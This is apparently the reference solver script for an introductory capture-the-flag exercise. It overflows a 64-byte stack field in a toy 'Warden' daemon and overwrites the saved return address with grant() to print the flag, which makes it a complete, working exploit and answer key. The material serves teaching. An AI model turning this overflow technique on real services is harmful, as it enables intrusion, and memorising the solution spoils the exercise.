#!/usr/bin/env python3
"""
ZSCTF :: Warden -- reference solver (classic ret2win / stack buffer overflow).

Intended path (nothing exotic -- this is an intro exercise):
  1. The daemon reads a license submission of up to 256 bytes into a 64-byte
     on-stack field. Submitting more than the field holds overruns it and, far
     enough past the field, overwrites main()'s saved return address.
  2. The binary is built -no-pie, so every routine sits at a fixed load address.
     grant() -- the routine that discloses the licensed-feature token (the flag)
     -- is never called on the ordinary verdict path, but it is still in the
     image at a fixed address.
  3. So: pad to the saved return address, then overwrite it with the address of
     grant(). When main() returns, control transfers to grant(), which prints
     the flag.

The payload is assembled by hand with struct.pack -- no pwntools, no framework.

Offset derivation (see writeup.md for the full annotated disassembly):
  main() does `sub $0x50,%rsp` and places `field` at rbp-0x50. That is 0x50 = 80
  bytes from the start of the field up to the saved RBP; the saved return address
  sits 8 bytes above that. Hence RET_OFFSET = 80 + 8 = 88.

Usage:
  Local  :  python3 solve.py --local ../build/warden
  Remote :  python3 solve.py --remote HOST PORT
"""
import sys
import socket
import struct
import argparse
import subprocess

# --- fixed facts about THIS binary (benign toy; -no-pie => stable address) ---
RET_OFFSET = 88            # bytes from field start to the saved return address
GRANT_ADDR = 0x4011df      # address of grant() in the reference build (fallback)


# --------------------------------------------------------------------------
# Minimal, dependency-free ELF symbol lookup. Used for --local so the exploit
# is robust across rebuilds (we read grant()'s address straight out of the
# binary's symbol table instead of trusting the baked-in constant). If the
# binary is stripped, we fall back to GRANT_ADDR.
# --------------------------------------------------------------------------
def elf_symbol_addr(path, name):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return None
    if data[:4] != b"\x7fELF":
        return None
    is64 = data[4] == 2
    le = "<" if data[5] == 1 else ">"
    if not is64:
        return None  # this challenge is x86-64 only
    e_shoff = struct.unpack_from(le + "Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from(le + "H", data, 0x3A)[0]
    e_shnum = struct.unpack_from(le + "H", data, 0x3C)[0]

    sections = []  # (sh_type, sh_offset, sh_size, sh_link, sh_entsize)
    for i in range(e_shnum):
        base = e_shoff + i * e_shentsize
        sh_type = struct.unpack_from(le + "I", data, base + 4)[0]
        sh_offset = struct.unpack_from(le + "Q", data, base + 0x18)[0]
        sh_size = struct.unpack_from(le + "Q", data, base + 0x20)[0]
        sh_link = struct.unpack_from(le + "I", data, base + 0x28)[0]
        sh_entsize = struct.unpack_from(le + "Q", data, base + 0x38)[0]
        sections.append((sh_type, sh_offset, sh_size, sh_link, sh_entsize))

    # SHT_SYMTAB == 2, SHT_DYNSYM == 11
    for sh_type, sh_offset, sh_size, sh_link, sh_entsize in sections:
        if sh_type not in (2, 11) or sh_entsize == 0:
            continue
        str_off = sections[sh_link][1]
        str_size = sections[sh_link][2]
        strtab = data[str_off:str_off + str_size]
        for off in range(sh_offset, sh_offset + sh_size, sh_entsize):
            st_name = struct.unpack_from(le + "I", data, off)[0]
            st_value = struct.unpack_from(le + "Q", data, off + 8)[0]
            end = strtab.find(b"\x00", st_name)
            sym = strtab[st_name:end]
            if sym == name.encode():
                return st_value
    return None


def build_payload(grant_addr):
    # pad up to the saved return address, then overwrite it with grant().
    return b"A" * RET_OFFSET + struct.pack("<Q", grant_addr)


# --- transports -----------------------------------------------------------
def run_local(binary, payload, timeout=20):
    p = subprocess.run([binary], input=payload,
                       capture_output=True, timeout=timeout)
    return p.stdout + p.stderr


def run_remote(host, port, payload, timeout=20):
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(payload)
        try:
            s.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        chunks = []
        while True:
            try:
                b = s.recv(4096)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
        return b"".join(chunks)


def extract_flag(blob):
    text = blob.decode("latin-1", "replace")
    i = text.find("zerosecurectf{")
    if i < 0:
        return None
    j = text.find("}", i)
    if j < 0:
        return None
    return text[i:j + 1]


def main():
    ap = argparse.ArgumentParser(description="Warden ret2win reference solver")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--local", metavar="BINARY",
                   help="path to the warden binary to spawn")
    g.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"),
                   help="host and port of a deployed instance")
    args = ap.parse_args()

    grant_addr = GRANT_ADDR
    if args.local:
        resolved = elf_symbol_addr(args.local, "grant")
        if resolved:
            grant_addr = resolved
            print("[*] resolved grant() from ELF symtab -> 0x%x" % grant_addr)
        else:
            print("[*] grant() not in symtab; using baked-in 0x%x" % grant_addr)

    payload = build_payload(grant_addr)
    print("[*] payload: %d bytes = %d padding + 8-byte return to grant()"
          % (len(payload), RET_OFFSET))

    if args.local:
        out = run_local(args.local, payload)
    else:
        out = run_remote(args.remote[0], int(args.remote[1]), payload)

    sys.stdout.buffer.write(b"--- service output ---\n")
    sys.stdout.buffer.write(out)
    if not out.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.flush()

    flag = extract_flag(out)
    if flag:
        print("[+] FLAG = " + flag)
        return 0
    print("[-] no flag recovered")
    return 1


if __name__ == "__main__":
    sys.exit(main())
